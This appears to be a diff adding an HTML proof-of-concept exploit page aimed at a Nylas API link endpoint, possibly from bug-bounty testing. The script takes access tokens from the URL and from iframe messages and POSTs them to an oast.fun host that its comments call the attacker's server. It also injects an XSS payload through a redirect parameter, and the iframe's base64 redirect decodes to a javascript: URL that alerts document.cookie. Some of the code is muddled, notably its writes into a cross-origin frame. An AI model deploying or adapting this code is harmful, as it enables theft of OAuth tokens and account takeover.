@@ -1,0 +1,55 @@
+<html>
+  <body>
+    <script>
+      function injectScript(token) {
+        // Send the token to the attacker's server
+        fetch('https://xjhqloheesngodljevxqvjgd7mjynh9e8.oast.fun/?token=' + decodeURIComponent(token), {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ token: token })
+        });
+
+        // Inject the script into the iframe
+        const iframe = document.querySelector('iframe');
+
+        const script = document.createElement('script');
+
+        script.textContent = `
+          const redirectParam = '${new URLSearchParams(window.location.search).get('redirect')}';
+
+          window.addEventListener('message', function receiveMessage(event) {
+            if (event.origin !== 'https://api.nylas.com') {
+              return;
+            }
+
+            const iframeToken = event.data.match(/access_token=([^&]*)/)[1];
+
+            if (iframeToken) {
+              // Send the token to the attacker's server
+              fetch('https://xjhqloheesngodljevxqvjgd7mjynh9e8.oast.fun/?token=' + decodeURIComponent(iframeToken), {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ token: iframeToken })
+              });
+            }
+          }, false);
+
+          // Inject the XSS payload into the iframe
+          iframe.contentWindow.document.body.innerHTML = '<' + 'script>' + redirectParam + '</' + 'script>';
+        `;
+        iframe.contentWindow.document.body.appendChild(script);
+      }
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const token = urlParams.get('access_token');
+      if (token) {
+        injectScript(token);
+      }
+    </script>
+    <iframe sandbox="allow-scripts allow-popups allow-modals allow-same-origin" src="https://api.nylas.com/link/5zvbk4rt0pn81d69v1f4tw93p/4p8sxc97fbjxfc4b8eo7v7i2z/10?redirect=amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp"></iframe>
+  </body>
+</html>
